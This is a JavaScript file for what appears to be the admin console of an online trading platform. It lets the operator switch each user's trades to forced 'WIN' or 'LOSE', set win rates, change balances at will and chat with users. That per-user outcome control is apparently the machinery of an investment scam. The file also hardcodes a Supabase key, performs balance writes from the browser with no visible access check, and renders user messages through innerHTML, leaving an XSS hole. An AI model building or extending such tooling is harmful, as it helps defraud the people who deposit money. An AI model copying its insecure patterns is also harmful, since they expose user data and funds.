/* --- DEF-ADMIN LOGIC CORE --- */

const SUPABASE_URL = "https://dpshdxvwgnynlvcyzwtu.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImRwc2hkeHZ3Z255bmx2Y3l6d3R1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjkwMDE1NzgsImV4cCI6MjA4NDU3NzU3OH0._RstDmMDkf8C7nYD-INfWHgxz2s3fgfDUy_Zs5JtGrU";

const { createClient } = supabase;
const db = createClient(SUPABASE_URL, SUPABASE_KEY);

let currentFundMode = 'add';
let currentChatUID = null;
let chatSubscription = null;

// ==========================================
// 1. STARTUP
// ==========================================
document.addEventListener('DOMContentLoaded', () => {
    fetchAllUsers();
    initChatListener();
});

// ==========================================
// 2. USER CONTROL (TAB 1)
// ==========================================
async function fetchAllUsers() {
    const container = document.getElementById('all-users-container');
    const { data: users, error } = await db.from('profiles').select('*').order('created_at', { ascending: false });

    if (error) { container.innerHTML = `<div class="text-danger">Error: ${error.message}</div>`; return; }
    if (!users || users.length === 0) { container.innerHTML = `<div class="text-muted">No users found.</div>`; return; }

    container.innerHTML = users.map(user => `
        <div class="user-row search-item">
            <div class="user-info">
                <div class="avatar" style="background: ${getRandomColor()}">${user.user_uid.substring(0,1)}</div>
                <div>
                    <div style="font-weight: bold;">User ${user.user_uid}</div>
                    <div style="font-size: 11px; color: #00e676;">UID: ${user.user_uid}</div>
                    <div style="font-size: 11px; color: #888;">Bal: $${parseFloat(user.balance).toFixed(2)}</div>
                </div>
            </div>
            <div class="control-panel">
                <div class="d-flex gap-1">
                    <button class="btn-toggle win ${user.trade_mode === 'win' ? 'active' : ''}" onclick="updateTradeSettings('${user.id}', 'win')">WIN</button>
                    <button class="btn-toggle lose ${user.trade_mode === 'lose' ? 'active' : ''}" onclick="updateTradeSettings('${user.id}', 'lose')">LOSE</button>
                </div>
                <div style="width: 1px; height: 20px; background: rgba(255,255,255,0.1); margin: 0 10px;"></div>
                <div class="d-flex align-items-center gap-1">
                    <input type="number" class="cyber-input" value="${user.win_rate || 80}" onchange="updateTradeRate('${user.id}', this.value)" style="width: 45px; text-align: center;">
                    <span style="font-size: 12px; color: #888;">%</span>
                </div>
            </div>
        </div>
    `).join('');
}

async function updateTradeSettings(userId, mode) {
    const { error } = await db.from('profiles').update({ trade_mode: mode }).eq('id', userId);
    if(!error) fetchAllUsers();
}

async function updateTradeRate(userId, rate) {
    await db.from('profiles').update({ win_rate: parseInt(rate) }).eq('id', userId);
}

function filterUserList() {
    const input = document.getElementById('user-search-input').value.toLowerCase();
    const items = document.getElementsByClassName('search-item');
    for (let item of items) item.style.display = item.innerText.toLowerCase().includes(input) ? "flex" : "none";
}

function getRandomColor() {
    return ['#0D8ABC', '#FF4D4D', '#00E676', '#FFD700'][Math.floor(Math.random() * 4)];
}

// ==========================================
// 3. FUNDS (TAB 2)
// ==========================================
async function checkUserForFunds() {
    const uid = document.getElementById('fund-search-uid').value.trim();
    const { data } = await db.from('profiles').select('*').eq('user_uid', uid).single();
    if(data) {
        document.getElementById('fund-action-area').style.display = 'block';
        document.getElementById('fund-target-uid').innerText = data.user_uid;
        document.getElementById('fund-target-balance').innerText = parseFloat(data.balance).toFixed(2);
        document.getElementById('fund-target-db-id').value = data.id;
    } else alert("User Not Found!");
}

function setFundMode(mode) {
    currentFundMode = mode;
    alert("Mode: " + mode.toUpperCase());
}

async function confirmFundUpdate() {
    const dbId = document.getElementById('fund-target-db-id').value;
    const amount = parseFloat(document.getElementById('fund-amount').value);
    const { data: user } = await db.from('profiles').select('balance').eq('id', dbId).single();
    let newBal = currentFundMode === 'add' ? user.balance + amount : user.balance - amount;
    await db.from('profiles').update({ balance: newBal }).eq('id', dbId);
    alert("Balance Updated!");
    checkUserForFunds();
    fetchAllUsers();
}

// ==========================================
// 4. CHAT (TAB 3)
// ==========================================
function initChatListener() {
    db.channel('admin-chat').on('postgres_changes', { event: 'INSERT', schema: 'public', table: 'messages' }, (p) => {
        refreshChatList();
        if (currentChatUID == p.new.uid && !p.new.is_admin) appendMessageToUI(p.new.content, 'user');
    }).subscribe();
    refreshChatList();
}

async function refreshChatList() {
    const { data } = await db.from('messages').select('uid').order('created_at', { ascending: false });
    if(data) {
        const uids = [...new Set(data.map(m => m.uid))];
        document.getElementById('chat-user-list').innerHTML = uids.map(uid => `
            <div class="chat-avatar-wrapper ${currentChatUID === uid ? 'active' : ''}" onclick="openChat('${uid}')">
                <div class="chat-avatar" style="background:#333; color:#fff; display:flex; align-items:center; justify-content:center;">${uid.substring(0,2)}</div>
            </div>
        `).join('');
    }
}

async function openChat(uid) {
    currentChatUID = uid;
    document.getElementById('chat-header-uid').innerText = uid;
    refreshChatList();
    const { data } = await db.from('messages').select('*').eq('uid', uid).order('created_at', { ascending: true });
    const display = document.getElementById('admin-chat-display');
    display.innerHTML = "";
    if(data) data.forEach(m => appendMessageToUI(m.content, m.is_admin ? 'admin' : 'user', m.created_at));
}

async function sendAdminReply() {
    const input = document.getElementById('admin-reply-input');
    const text = input.value.trim();
    if(text && currentChatUID) {
        appendMessageToUI(text, 'admin');
        await db.from('messages').insert([{ uid: currentChatUID, content: text, is_admin: true }]);
        input.value = "";
    }
}

function appendMessageToUI(text, sender, time = null) {
    const display = document.getElementById('admin-chat-display');
    const div = document.createElement('div');
    div.className = `msg msg-${sender}`;
    div.innerHTML = `${text}<div style="font-size:9px; opacity:0.5; margin-top:4px;">${time ? new Date(time).toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}) : 'Just now'}</div>`;
    display.appendChild(div);
    display.scrollTop = display.scrollHeight;
}

function handleEnter(e) { if(e.key === 'Enter') sendAdminReply(); }
function handleLogout() { if(confirm("Logout?")) window.location.reload(); }